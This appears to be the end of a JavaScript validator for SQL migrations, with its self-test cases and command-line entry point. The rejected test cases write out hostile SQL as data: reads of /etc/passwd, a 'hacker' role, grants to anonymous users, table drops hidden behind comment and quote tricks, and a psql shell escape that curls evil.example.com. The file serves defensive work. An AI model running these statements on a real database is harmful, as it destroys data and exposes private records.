  ['truncate', 'truncate table public.games;', 'TRUNCATE'],
  ['delete', "delete from public.games where id = '1';", 'data mutation'],
  ['update', 'update public.players set goals = 0;', 'data mutation'],
  ['insert', "insert into public.teams (name) values ('x');", 'data mutation'],
  ['disable rls', 'alter table public.players disable row level security;', 'DISABLE'],
  ['no force rls', 'alter table public.players no force row level security;', 'weakens RLS'],
  ['drop policy', 'drop policy "Public read players" on public.players;', 'DROP'],
  ['alter policy', 'alter policy "Public read players" on public.players using (true);', 'ALTER POLICY'],
  ['revoke', 'revoke select on public.players from authenticated;', 'REVOKE'],
  ['alter default privileges', 'alter default privileges in schema public grant select on tables to authenticated;', 'DEFAULT PRIVILEGES'],
  ['grant to anon', 'grant select on public.players to anon;', 'GRANT'],
  ['grant to public', 'grant select on public.teams to public;', 'GRANT'],
  ['policy to anon', 'create policy p on public.teams for select to anon using (true);', 'anon'],
  ['policy to public', 'create policy p on public.teams for select to public using (true);', 'TO public'],
  ['policy with no TO clause', 'create policy p on public.teams for select using (true);', 'no TO clause'],
  ['security definer function', `
    create function public.settle(p uuid) returns void
    language plpgsql security definer as $$ begin return; end; $$;
  `, 'SECURITY DEFINER'],
  ['create or replace function', `
    create or replace function public.is_admin() returns boolean
    language sql as $$ select true $$;
  `, 'CREATE OR REPLACE FUNCTION'],
  ['function body with dynamic SQL', `
    create function public.f(q text) returns void
    language plpgsql as $$ begin execute q; end; $$;
  `, 'EXECUTE'],
  ['function body that writes', `
    create function public.f() returns void
    language plpgsql as $$ begin delete from public.games; end; $$;
  `, 'writes or changes'],
  ['function body given as a string literal', `
    create function public.f() returns integer language sql as 'select 1';
  `, 'string literal'],
  ['create role', "create role hacker login password 'x';", 'role management'],
  ['alter role', 'alter role service_role nologin;', 'role management'],
  ['alter role password', "alter role league_bot password 'x';", 'password'],
  ['create extension', 'create extension if not exists http;', 'EXTENSION'],
  ['copy', "copy public.players from '/etc/passwd';", 'COPY'],
  // the DROP here lives inside a string literal, so it is (correctly) invisible to the
  // keyword scan — what catches this statement is dblink itself, and the bare-query rule.
  ['dblink', "select dblink_exec('dbname=x', 'drop table y');", 'dblink'],
  ['pg_read_file', "comment on table public.teams is 'x';\nselect pg_read_file('/etc/passwd');", 'filesystem'],
  ['auth schema table', 'create index if not exists i on auth.users (email);', 'auth.users'],
  ['auth schema DDL', 'alter table auth.users add column if not exists nickname text;', 'auth'],
  ['storage schema', 'create policy p on storage.objects for select to authenticated using (true);', 'storage'],
  ['extensions schema', 'create index if not exists i on extensions.foo (a);', 'extensions'],
  ['pg_cron', "select cron.schedule('x', '* * * * *', 'select 1');", 'bare query'],
  ['admin_users', 'create policy p on public.admin_users for select to authenticated using (true);', 'admin_users'],
  ['admin_users behind quotes', 'create policy p on public."admin_users" for select to authenticated using (true);', 'admin_users'],
  ['medical surface', 'alter table public.medical_certificates add column if not exists note text;', 'medical'],
  ['birth_date', 'create index if not exists i on public.players (birth_date);', 'birth_date'],
  ['do block', 'do $$ begin perform 1; end $$;', 'DO block'],
  ['create view', 'create view public.v as select * from public.players;', 'CREATE VIEW'],
  ['bare select', 'select 1;', 'bare query'],
  ['transaction control', 'begin; alter table public.teams add column if not exists x text; commit;', 'transaction control'],
  ['set role', 'set role postgres;', 'SET/RESET'],
  ['psql shell escape', "\\! curl http://evil.example.com\nalter table public.teams add column if not exists x text;", 'meta-command'],
  ['psql include', "\\i /tmp/payload.sql", 'meta-command'],
  ['new table without RLS', `
    create table if not exists public.leak (id uuid primary key, secret text);
  `, 'ENABLE ROW LEVEL SECURITY'],
  ['create table without IF NOT EXISTS', `
    create table public.leak (id uuid primary key);
    alter table public.leak enable row level security;
  `, 'IF NOT EXISTS'],
  ['not-null column with no default', 'alter table public.games add column if not exists must text not null;', 'no DEFAULT'],
  ['index concurrently', 'create index concurrently if not exists i on public.games (season_id);', 'CONCURRENTLY'],
  ['trigger on a function this file does not define', `
    create trigger t after insert on public.games for each row execute function public.settle_market();
  `, 'does not define'],
  // --- the hiding cases ---
  ['a dangerous statement after a harmless comment', `
    -- adds a column
    alter table public.teams add column if not exists x text;
    /* nothing to see here */
    drop table public.players;
  `, 'DROP'],
  ['danger hidden behind a -- INSIDE a string literal', `
    comment on table public.teams is 'this string contains -- which is not a comment';
    drop table public.players;
  `, 'DROP'],
  ['danger hidden behind a $$ INSIDE a string literal', `
    comment on table public.teams is 'a $$ inside a string';
    drop table public.players;
    -- $$
  `, 'DROP'],
  ['danger hidden behind a quote inside a comment', `
    -- it's fine, really
    grant select on public.players to anon;
  `, 'GRANT'],
  ['only the LAST statement of many is dangerous', `
    alter table public.teams add column if not exists a text;
    alter table public.teams add column if not exists b text;
    create index if not exists teams_a_idx on public.teams (a);
    comment on column public.teams.a is 'first';
    grant select on public.players to anon;
  `, 'GRANT'],
  ['unterminated string literal', "comment on table public.teams is 'oops;", 'unterminated'],
  ['unterminated block comment', '/* alter table public.teams add column if not exists x text;', 'unterminated'],
  ['unterminated dollar body', 'create function public.f() returns integer language sql as $$ select 1;', 'unterminated'],
  ['empty file', '   \n  -- nothing here\n', 'no statements'],
];

function selftest() {
  let failed = 0;
  let ran = 0;

  for (const [name, sql] of PASS) {
    ran += 1;
    const { errors } = checkSql(sql, 'test.sql');
    if (errors.length) {
      failed += 1;
      console.log(`FAIL (expected PASS) — ${name}`);
      for (const e of errors) console.log(`        ${e.split('\n')[0]}`);
    } else {
      console.log(`  ok   PASS — ${name}`);
    }
  }

  for (const [name, sql, expect] of FAIL) {
    ran += 1;
    const { errors } = checkSql(sql, 'test.sql');
    const joined = errors.join('\n');
    if (errors.length === 0) {
      failed += 1;
      console.log(`FAIL (expected REJECT, got PASS) — ${name}`);
    } else if (expect && !joined.toLowerCase().includes(expect.toLowerCase())) {
      failed += 1;
      console.log(`FAIL (rejected, but not for the expected reason "${expect}") — ${name}`);
      console.log(`        ${joined.split('\n')[0]}`);
    } else {
      console.log(`  ok   REJECT — ${name}`);
    }
  }

  console.log(`\n${ran - failed}/${ran} self-checks passed`);
  return failed === 0 ? 0 : 1;
}

// ---------------------------------------------------------------------------
// 7. CLI
// ---------------------------------------------------------------------------

function main(argv) {
  if (argv.includes('--selftest')) return selftest();

  const files = argv.filter((a) => !a.startsWith('-'));
  if (files.length === 0) {
    console.error('usage: node scripts/check-migration.mjs <file.sql> [...]');
    console.error('       node scripts/check-migration.mjs --selftest');
    return 2;
  }

  let bad = 0;
  for (const file of files) {
    let sql;
    try {
      sql = readFileSync(file, 'utf8');
    } catch (err) {
      console.error(`REJECTED ${file}: cannot read (${err.message})`);
      bad += 1;
      continue;
    }
    const { errors, warnings } = checkSql(sql, basename(file));
    for (const w of warnings) console.log(`  warning: ${w}`);
    if (errors.length) {
      bad += 1;
      console.error(`\nREJECTED ${file}`);
      for (const e of errors) console.error(`  - ${e}`);
    } else {
      console.log(`OK ${file}`);
    }
  }

  if (bad) {
    console.error(`\n${bad} file(s) rejected. Nothing has been applied to the database.`);
    console.error('This validator is an allowlist: if a statement is not one of a few known-safe shapes it is refused,');
    console.error('even when it is harmless. A human can apply it by hand — see docs/LIVE-EDIT-MIGRATIONS.md.');
    return 1;
  }
  console.log(`\nAll ${files.length} migration file(s) passed.`);
  return 0;
}

process.exit(main(process.argv.slice(2)));
